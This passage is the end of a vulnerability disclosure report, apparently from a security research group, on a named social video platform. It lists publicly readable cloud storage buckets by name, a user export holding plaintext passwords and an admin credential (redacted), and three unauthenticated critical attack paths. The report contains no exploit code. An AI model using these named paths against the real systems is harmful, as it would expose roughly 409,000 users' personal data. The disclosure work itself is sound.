| fcm_token | [REDACTED — present, push notification token for admin device] |

The `fcm_token` field in each row is a Firebase Cloud Messaging device token. The admin row contains the FCM token for the administrative account's registered device. Any actor with the token can send push notifications directly to that device without going through the GraphQL API.

The `password` field present alongside a `secretHash` column suggests a migration period where accounts were assigned both a legacy plaintext credential and a new bcrypt hash. The admin account was not migrated to the bcrypt-only path.

**F12 is a compounding escalation of F11.** F11 established that the file was publicly accessible. F12 confirms the data class: production PII plus credential material. The GCS bucket ACL is the root issue for both.

### F13 — Additional GCS Buckets: Video Infrastructure Publicly Accessible (HIGH)

Three additional GCS buckets confirmed publicly accessible:

| Bucket | Likely purpose |
|--------|---------------|
| `djaminn-hls-vid-tf` | HLS-segmented video streams (TrailFive-suffixed naming) |
| `djaminn-original-vid-tf` | Original video uploads before transcoding |
| `djam_rn` | React Native build artifacts or media assets |

All three were accessible without authentication. Object listings and direct downloads were not performed beyond bucket existence and accessibility confirmation. `djaminn-original-vid-tf` contains user-uploaded content prior to any compression or format conversion — full-resolution video uploaded by platform users.

The `-tf` suffix matches the TrailFive Technologies naming convention seen in the dev shop attribution (F-series entries). Bucket names were likely set by the development team rather than Djaminn BV directly.

CDN buckets `b2cdn.djaminn.app` and `bcdn.djaminn.app` return 403 — GCS uniform bucket-level access was correctly applied to the CDN origin. The export and video buckets did not receive the same treatment.

---

### Revised Finding Summary (Final)

| Finding | ID | Severity | Auth state |
|---------|----|----------|------------|
| RedisInsight unauth credential leak | F1 | CRITICAL | No auth |
| Redis AUTH via leaked credential | F2 | CRITICAL | Bypassed via F1 |
| Social platform data class in Redis keyspace | F3 | HIGH | Via F2 |
| GraphQL introspection unauth + admin ops unauth | F4 | CRITICAL | No auth (data returned) |
| Server path disclosure via Apollo stack trace (dev-api) | F5 | LOW | No auth |
| APAC region CMS node firewalled | F6 | UNRATED | Network-blocked |
| Production GraphQL: introspection open, data auth enforced | F7 | HIGH | Mixed per-resolver |
| getCustomUsersCsv signed URL generated unauth | F8 | HIGH | No auth |
| dev-api confirmed bare VM, not containerized | F9 | LOW | — |
| cmsprod.djaminn.app 502, credential unchanged | F10 | — | Reconfirmation |
| GCS bucket djaminn-api-data-csv world-listable | F11 | CRITICAL | No auth — direct browser access |
| user-prod.csv plaintext passwords + admin credential | F12 | CRITICAL | No auth (file publicly readable) |
| Additional GCS video buckets publicly accessible | F13 | HIGH | No auth |

**Three independent CRITICAL paths, no credentials required:**
1. F1/F2: RedisInsight credential leak -> Redis AUTH
2. F4: GraphQL dev-api unauth admin operations
3. F11/F12: GCS public bucket with 418 MB production user export containing admin plaintext password

F11 and F12 are independent of everything else. `user-prod.csv` contains approximately 409,000 user records with PII plus a production admin credential in plaintext. The file has been in publicly accessible ARCHIVE-class storage since 2024-01-12: 500 days before this enumeration.

*NuClide Research — 2026-05-26*
